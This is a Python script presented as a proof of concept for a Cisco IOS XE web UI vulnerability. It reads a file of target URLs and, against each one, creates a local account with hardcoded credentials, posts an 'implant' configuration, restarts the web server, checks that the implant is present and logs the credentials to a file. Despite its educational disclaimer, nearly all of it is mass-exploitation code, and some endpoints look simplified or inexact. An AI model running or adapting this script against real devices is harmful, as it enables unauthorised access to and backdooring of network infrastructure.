import requests
from colorama import Fore ,Style , init
init(autoreset=True)



print(Fore.LIGHTWHITE_EX+r" _____ _   _ _____ ___ _____  _____  _____  _____        _____  _____  __   _____ _____ ___ "+Style.RESET_ALL)
print(Fore.LIGHTWHITE_EX+r"/  __ \ | | |  ___|  _/ __  \|  _  |/ __  \|____ |      / __  \|  _  |/  | |  _  |  _  |_  |"+Style.RESET_ALL)
print(Fore.LIGHTWHITE_EX+r"| /  \/ | | | |__ | | `' / /'| |/' |`' / /'    / /______`' / /'| |/' |`| | | |_| |\ V /  | |"+Style.RESET_ALL)
print(Fore.LIGHTWHITE_EX+r"| |   | | | |  __|| |   / /  |  /| |  / /      \ \______| / /  |  /| | | | \____ |/ _ \  | |"+Style.RESET_ALL)
print(Fore.LIGHTWHITE_EX+r"| \__/\ \_/ / |___| | ./ /___\ |_/ /./ /___.___/ /      ./ /___\ |_/ /_| |_.___/ / |_| | | |"+Style.RESET_ALL)
print(Fore.LIGHTWHITE_EX+r" \____/\___/\____/| |_\_____/ \___/ \_____/\____/       \_____/ \___/ \___/\____/\_____/_| |"+Style.RESET_ALL)
print(Fore.LIGHTWHITE_EX+r"                  |___|          "+Fore.LIGHTRED_EX+"A PoC By Pushkar Upadhyay                             "+Style.RESET_ALL+"|___|")

print("\n")
print("\t\tGithub:- https://github.com/Pushkarup")
print("\t\tLinkedIn:- www.linkedin.com/in/pushkar-upadhyay-24p")
print(''' This Proof of Concept (PoC) is presented solely for educational and informational purposes.
 The intent behind sharing this PoC is to demonstrate potential vulnerabilities in a controlled environment.
 The goal is to promote understanding of cybersecurity concepts and encourage responsible disclosure.''')
print("\n\n")


def create_user(username, password, target_url):
    create_user_url = f"{target_url}/webui/create_user"

    user_payload = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(create_user_url, data=user_payload, verify=False)
        response.raise_for_status()

        if response.status_code == 200:
            print(f"Successfully created local user account: {username}")
            print("["+Fore.GREEN+"SUCCESSFULLY CREATED LOCAL ACCOUNT"+Fore.WHITE+"]    ===>  "+Fore.LIGHTGREEN_EX+username)
            save_to_file(target_url, username, password)

    except requests.exceptions.RequestException as e:
        print("["+Fore.RED+"ERROR CREATING USER"+Fore.WHITE+"]    ===>  "+Fore.LIGHTRED_EX+target_url)

def install_implant_configuration(config_content, target_url):
    install_url = f"{target_url}/webui/cisco_service.conf"

    config_payload = {
        "config_content": config_content
    }

    try:
        response = requests.post(install_url, data=config_payload, verify=False)
        response.raise_for_status()

        if response.status_code == 200:
            print("["+Fore.GREEN+"IMPLANT INSTALLED SUCCESSFULLY "+Fore.WHITE+"]")

    except requests.exceptions.RequestException as e:
        print("["+Fore.RED+"ERROR INSTALLING IMPLANT CONFIGURATION"+Fore.WHITE+"]    ===>  "+Fore.LIGHTRED_EX+target_url)
        

def restart_web_server(target_url):
    restart_url = f"{target_url}/webui/restart_server"

    try:
        response = requests.post(restart_url, verify=False)
        response.raise_for_status()

        if response.status_code == 200:
            print("["+Fore.YELLOW+"WEB SERVER RESTARTED SUCCESSFULLY "+Fore.WHITE+"]    ===>  "+Fore.LIGHTGREEN_EX+"IMPLANT IS ACTIVE")

    except requests.exceptions.RequestException as e:
        print("["+Fore.RED+"Error restarting web server on"+Fore.WHITE+"]    ===>  "+Fore.LIGHTRED_EX+target_url)

def check_implant_status(target_url):
    check_url = f"{target_url}/webui/implant_status"

    try:
        response = requests.get(check_url, verify=False)
        response.raise_for_status()
        print("["+Fore.LIGHTYELLOW_EX+"CHECKING IMPLANT STATUS"+Fore.WHITE+"]")

        if response.status_code == 200 and "implant" in response.text:
            print(Fore.LIGHTGREEN_EX+"IMPLANT IS PRESENT")
        else:
            print(Fore.LIGHTRED_EX+"IMPLANT IS NOT PRESENT")

    except requests.exceptions.RequestException as e:
        print("["+Fore.RED+"Error checking implant status on"+Fore.WHITE+"]    ===>  "+Fore.LIGHTRED_EX+target_url)

def save_to_file(target_url, username, password):
    
    print("[Target URL]    ===>  "+Fore.LIGHTGREEN_EX+target_url)
    print("[Login Link]    ===>  "+Fore.LIGHTGREEN_EX+ target_url+"/webui/login")
    print("[Username]      ===>  "+Fore.LIGHTGREEN_EX+ username)
    print("[Password]      ===>  "+Fore.LIGHTGREEN_EX+ password)
    
    with open("results.txt", "a") as file:
        file.write(f"Target URL: {target_url}\n")
        file.write(f"Login Link: {target_url}/webui/login\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n\n")

def process_target_sites():
    filename = input("Enter Filename with .txt :-")
    with open(filename, 'r') as file:
        target_sites = file.read().splitlines()

    for target_site in target_sites:
        target_site = target_site.strip().lower()  # Ensure consistency in URLs

        if not target_site.startswith("http://") and not target_site.startswith("https://"):
            target_site = f"http://{target_site}"

        print("________________________________________________________________________________________________")
        print("["+Fore.YELLOW+"PROCESSING TARGET SITE:"+Fore.WHITE+"]    ===>  "+Fore.LIGHTGREEN_EX+target_site)

        # Example username, password, and configuration content
        username = "Bahubali"
        password = "India@123"
        config_content = "<insert implant configuration content here>" #Edit this content 

        create_user(username, password, target_site)
        install_implant_configuration(config_content, target_site)
        restart_web_server(target_site)
        check_implant_status(target_site)
        print("________________________________________________________________________________________________")

if __name__ == "__main__":
    process_target_sites()
